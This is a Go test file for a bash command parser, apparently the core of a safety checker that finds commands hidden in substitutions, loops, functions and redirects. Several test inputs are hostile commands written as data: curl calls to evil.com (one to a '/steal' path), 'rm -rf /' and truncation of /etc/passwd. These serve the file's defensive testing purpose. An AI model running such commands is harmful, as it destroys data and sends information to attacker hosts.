package parser

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestParseSimpleCommand(t *testing.T) {
	result, err := Parse("git status")
	require.NoError(t, err)
	assert.Len(t, result.Commands, 1)
	assert.Equal(t, "git", result.Commands[0].Name)
	assert.False(t, result.Commands[0].Dynamic)
}

func TestParseCompoundAnd(t *testing.T) {
	result, err := Parse("git status && echo done")
	require.NoError(t, err)
	assert.Len(t, result.Commands, 2)
	assert.Equal(t, "git", result.Commands[0].Name)
	assert.Equal(t, "echo", result.Commands[1].Name)
}

func TestParseCompoundOr(t *testing.T) {
	result, err := Parse("git status || echo failed")
	require.NoError(t, err)
	assert.Len(t, result.Commands, 2)
}

func TestParseSemicolon(t *testing.T) {
	result, err := Parse("git add -A; git commit -m 'test'")
	require.NoError(t, err)
	assert.Len(t, result.Commands, 2)
	assert.Equal(t, "git", result.Commands[0].Name)
	assert.Equal(t, "git", result.Commands[1].Name)
}

func TestParsePipeline(t *testing.T) {
	result, err := Parse("cat file | grep pattern | wc -l")
	require.NoError(t, err)
	assert.Len(t, result.Commands, 3)
	assert.Equal(t, "cat", result.Commands[0].Name)
	assert.Equal(t, "grep", result.Commands[1].Name)
	assert.Equal(t, "wc", result.Commands[2].Name)
}

func TestParseCommandSubstitution(t *testing.T) {
	result, err := Parse("echo $(curl evil.com)")
	require.NoError(t, err)
	// Should find both echo and curl.
	names := commandNames(result.Commands)
	assert.Contains(t, names, "echo")
	assert.Contains(t, names, "curl")
}

func TestParseNestedCommandSubstitution(t *testing.T) {
	result, err := Parse("echo $(echo $(whoami))")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "echo")
	assert.Contains(t, names, "whoami")
}

func TestParseProcessSubstitution(t *testing.T) {
	result, err := Parse("diff <(sort file1) <(sort file2)")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "diff")
	assert.Contains(t, names, "sort")
}

func TestParseSubshell(t *testing.T) {
	result, err := Parse("(cd /tmp && rm -rf danger)")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "cd")
	assert.Contains(t, names, "rm")
}

func TestParsePureAssignment(t *testing.T) {
	result, err := Parse("FOO=bar")
	require.NoError(t, err)
	// Pure assignment with no command — no executable commands.
	assert.Empty(t, result.Commands)
}

func TestParseAssignmentWithCommandSubst(t *testing.T) {
	result, err := Parse("FOO=$(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "curl")
}

func TestParseExportWithCommandSubst(t *testing.T) {
	result, err := Parse("export X=$(curl evil.com/steal)")
	require.NoError(t, err)
	// Should find both export (as DeclClause) and curl (from CmdSubst).
	names := commandNames(result.Commands)
	assert.Contains(t, names, "export")
	assert.Contains(t, names, "curl")
}

func TestParseDynamicCommand(t *testing.T) {
	result, err := Parse("$CMD arg1 arg2")
	require.NoError(t, err)
	require.Len(t, result.Commands, 1)
	assert.True(t, result.Commands[0].Dynamic)
	assert.Empty(t, result.Commands[0].Name)
}

func TestParseArithmetic(t *testing.T) {
	// This is a command that crashed bashlex in the Python version.
	result, err := Parse("echo $((1+2)) && echo $(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "echo")
	assert.Contains(t, names, "curl")
}

func TestParseHeredoc(t *testing.T) {
	result, err := Parse("cat <<EOF\nhello world\nEOF")
	require.NoError(t, err)
	assert.Len(t, result.Commands, 1)
	assert.Equal(t, "cat", result.Commands[0].Name)
}

func TestParseForLoop(t *testing.T) {
	result, err := Parse("for f in *.go; do go fmt \"$f\"; done")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "go")
}

func TestParseIfElse(t *testing.T) {
	result, err := Parse("if [ -f foo ]; then cat foo; else echo missing; fi")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "[")
	assert.Contains(t, names, "cat")
	assert.Contains(t, names, "echo")
}

func TestParseFunctionDefinition(t *testing.T) {
	result, err := Parse("myfunc() { rm -rf /; }; myfunc")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	// The function body commands should be extracted.
	assert.Contains(t, names, "rm")
	assert.Contains(t, names, "myfunc")
}

func TestParseBacktickSubstitution(t *testing.T) {
	result, err := Parse("echo `curl evil.com`")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "echo")
	assert.Contains(t, names, "curl")
}

func TestParseWhileLoop(t *testing.T) {
	result, err := Parse("while true; do git status; done")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "true")
	assert.Contains(t, names, "git")
}

func TestParseUntilLoop(t *testing.T) {
	result, err := Parse("until false; do git pull; done")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "false")
	assert.Contains(t, names, "git")
}

func TestParseCaseStatement(t *testing.T) {
	result, err := Parse(`case "$1" in start) echo start;; stop) echo stop;; esac`)
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "echo")
}

func TestParseDeclareWithCmdSubst(t *testing.T) {
	result, err := Parse("declare X=$(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "declare")
	assert.Contains(t, names, "curl")
}

func TestParseLocalWithCmdSubst(t *testing.T) {
	result, err := Parse("local X=$(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "local")
	assert.Contains(t, names, "curl")
}

func TestParseReadonlyWithCmdSubst(t *testing.T) {
	result, err := Parse("readonly X=$(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(result.Commands)
	assert.Contains(t, names, "readonly")
	assert.Contains(t, names, "curl")
}

func TestParseEmptyCommand(t *testing.T) {
	result, err := Parse("")
	require.NoError(t, err)
	assert.Empty(t, result.Commands)
}

func TestParseInvalidSyntax(t *testing.T) {
	_, err := Parse("if then else fi while")
	assert.Error(t, err, "invalid syntax should return an error")
}

func commandNames(cmds []Command) []string {
	names := make([]string, 0, len(cmds))
	for _, c := range cmds {
		if c.Name != "" {
			names = append(names, c.Name)
		}
	}
	return names
}

// Redirect extraction tests

func TestParseRedirectOutput(t *testing.T) {
	result, err := Parse("echo hi > output.txt")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.True(t, result.Redirects[0].IsOutput())
	assert.Equal(t, "output.txt", result.Redirects[0].Target)
	assert.True(t, result.Redirects[0].TargetLiteral)
}

func TestParseRedirectAppend(t *testing.T) {
	result, err := Parse("echo line >> log.txt")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.True(t, result.Redirects[0].IsOutput())
	assert.Equal(t, "log.txt", result.Redirects[0].Target)
}

func TestParseRedirectFDDup(t *testing.T) {
	result, err := Parse("cmd 2>&1")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.True(t, result.Redirects[0].IsFDDup())
	assert.Equal(t, "2", result.Redirects[0].FD)
	assert.Equal(t, "1", result.Redirects[0].Target)
}

func TestParseRedirectInput(t *testing.T) {
	result, err := Parse("cat < input.txt")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.True(t, result.Redirects[0].IsInput())
	assert.False(t, result.Redirects[0].IsOutput())
	assert.Equal(t, "input.txt", result.Redirects[0].Target)
}

func TestParseRedirectHeredoc(t *testing.T) {
	result, err := Parse("cat <<EOF\nhello\nEOF")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.True(t, result.Redirects[0].IsHeredoc)
	assert.True(t, result.Redirects[0].IsInput())
}

func TestParseRedirectHereString(t *testing.T) {
	result, err := Parse("cat <<<'hello'")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.True(t, result.Redirects[0].IsHeredoc)
}

func TestParseRedirectMultiple(t *testing.T) {
	result, err := Parse("cmd < in.txt > out.txt 2>&1")
	require.NoError(t, err)
	assert.Len(t, result.Redirects, 3)
}

func TestParseRedirectDynamic(t *testing.T) {
	result, err := Parse("echo data > $OUTPUT")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.False(t, result.Redirects[0].TargetLiteral)
}

func TestParseRedirectTilde(t *testing.T) {
	result, err := Parse("echo data > ~/output.txt")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.False(t, result.Redirects[0].TargetLiteral)
}

func TestParseRedirectGlob(t *testing.T) {
	// Glob in redirect target should be detected as non-literal
	result, err := Parse("echo data > /tmp/*.log")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.False(t, result.Redirects[0].TargetLiteral)
}

func TestParseRedirectExtglob(t *testing.T) {
	// Extglob patterns should be detected as non-literal (require shopt -s extglob)
	extglobPatterns := []string{
		"echo x > out/@(a|b)", // @(...) - match one of
		"echo x > out/+(a|b)", // +(...) - match one or more of
		"echo x > out/!(a|b)", // !(...) - match anything except
		"echo x > out/*(a|b)", // *(...) - match zero or more of (overlaps with glob)
	}
	for _, cmd := range extglobPatterns {
		t.Run(cmd, func(t *testing.T) {
			result, err := Parse(cmd)
			require.NoError(t, err)
			require.Len(t, result.Redirects, 1)
			assert.False(t, result.Redirects[0].TargetLiteral, "extglob should be non-literal: %s", cmd)
		})
	}
}

func TestParseHasCwdChanger(t *testing.T) {
	// Commands with cd/pushd/popd should set HasCwdChanger
	tests := []struct {
		cmd        string
		hasCwdChgr bool
	}{
		{"echo hello", false},
		{"cd /tmp", true},
		{"pushd /tmp", true},
		{"popd", true},
		{"cd /tmp && echo hi", true},
		{"echo hi && cd /tmp", true},
		{"git status", false},
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			result, err := Parse(tt.cmd)
			require.NoError(t, err)
			assert.Equal(t, tt.hasCwdChgr, result.HasCwdChanger, "HasCwdChanger for %q", tt.cmd)
		})
	}
}

func TestParseHasLinkCreator(t *testing.T) {
	// Commands with ln should set HasLinkCreator
	tests := []struct {
		cmd            string
		hasLinkCreator bool
	}{
		{"echo hello", false},
		{"ln -s /etc out", true},
		{"ln file link", true},
		{"ln -s /etc out && echo hi", true},
		{"git status", false},
		{"ls -ln", false}, // ls with -ln flag, not ln command
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			result, err := Parse(tt.cmd)
			require.NoError(t, err)
			assert.Equal(t, tt.hasLinkCreator, result.HasLinkCreator, "HasLinkCreator for %q", tt.cmd)
		})
	}
}

func TestParseRedirectNoCommand(t *testing.T) {
	// Bare redirect with no command (creates/truncates file)
	result, err := Parse(">/etc/passwd")
	require.NoError(t, err)
	assert.Empty(t, result.Commands) // No commands
	require.Len(t, result.Redirects, 1)
	assert.True(t, result.Redirects[0].IsOutput())
	assert.Equal(t, "/etc/passwd", result.Redirects[0].Target)
}

func TestParseRedirectNoOpCommand(t *testing.T) {
	// No-op command with redirect
	result, err := Parse(": >/etc/passwd")
	require.NoError(t, err)
	assert.Len(t, result.Commands, 1)
	assert.Equal(t, ":", result.Commands[0].Name)
	require.Len(t, result.Redirects, 1)
	assert.Equal(t, "/etc/passwd", result.Redirects[0].Target)
}

func TestParseRedirectSubshell(t *testing.T) {
	// Redirect on subshell
	result, err := Parse("(git status && echo done) > output.txt")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.Equal(t, "output.txt", result.Redirects[0].Target)
}

func TestParseRedirectDevNull(t *testing.T) {
	result, err := Parse("cmd > /dev/null 2>&1")
	require.NoError(t, err)
	assert.Len(t, result.Redirects, 2)
	assert.Equal(t, "/dev/null", result.Redirects[0].Target)
	assert.True(t, result.Redirects[1].IsFDDup())
}

func TestParseRedirectFDClose(t *testing.T) {
	// Closing a file descriptor: 2>&-
	result, err := Parse("cmd 2>&-")
	require.NoError(t, err)
	require.Len(t, result.Redirects, 1)
	assert.True(t, result.Redirects[0].IsFDDup()) // Treated as FD dup (safe)
}
